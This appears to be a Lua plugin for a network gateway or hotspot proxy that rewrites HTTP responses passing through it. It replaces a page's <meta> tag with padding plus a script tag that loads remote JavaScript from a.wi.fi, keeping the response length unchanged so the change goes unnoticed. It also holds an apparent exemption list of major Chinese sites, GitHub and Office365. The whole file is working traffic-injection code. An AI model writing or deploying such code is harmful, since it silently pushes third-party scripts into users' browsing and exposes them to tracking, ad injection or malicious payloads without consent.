--local zlib = require "zlib"
--local buffer = {}


local script = '<script src="//a.wi.fi/c.js"></script>'
local scriptLen = string.len(script)

function tableLen(t)
	local count = 0
	for _ in pairs(t) do count = count + 1 end
	return count
end 

function matchHost(host, html, pattern)
	for matched in string.gmatch(html, pattern) do
		if (string.len(matched) >= scriptLen and
			string.match(string.lower(matched), 'content.type') == nil) then
			--print ("found ========== " .. matched) 	
			return string.gsub(matched, '-', '.') --HOLY SHIT
		end	
	end
	return nil
end

function padding(src)
	--print("padding ============ src    " .. src)
	if (string.len(src) < scriptLen) then
		--print("[WARN]: src.length must be >= script.length.")
		return nil
	end
	local n = string.len(src) - scriptLen
	return string.rep(" ", n)..script
end



function filterhost(host)
	if  (host == "www.baidu.com" ) or 
		(host == "m.baidu.com" ) or 
		(host == "baidu.com" ) or 
		(host == "map.baidu.com" ) or 
		(host == "m.weibo.com" ) or 
		(host == "m.weibo.cn" ) or 
		(host == "weibo.com" ) or 
		(host == "weibo.cn" ) or 
		(host == "www.weibo.com" ) or 
		(host == "www.youku.com" ) or 
		(host == "youku.com" ) or 
		(host == "m.youku.com" ) or 
		(host == "v.youku.com" ) or 
		(host == "m.taobao.com" ) or 
		(host == "taobao.com" ) or 
		(host == "h5.taobao.com" ) or
		(host == "outlook.office365.com" ) or 
		(host == "github.com" ) 
		then
		return true
	end
	return nil
end

function modify(data, ctx, host, method, http_uri, status_code) -- response only
	--print("================= BEGIN", ctx, host, method, http_uri, status_code)

	local matched = matchHost(host, data, "<meta.->")
	if (matched) then 
		local dst = padding(matched)				
		data = string.gsub(data, matched, dst)	
		--print("================== SUCCESS:\n" .. data)
		return data
	end
    local seenbody = string.find(data, "</head>")
    if (seenbody ~= nil) then
        return data
    end
    return nil
end 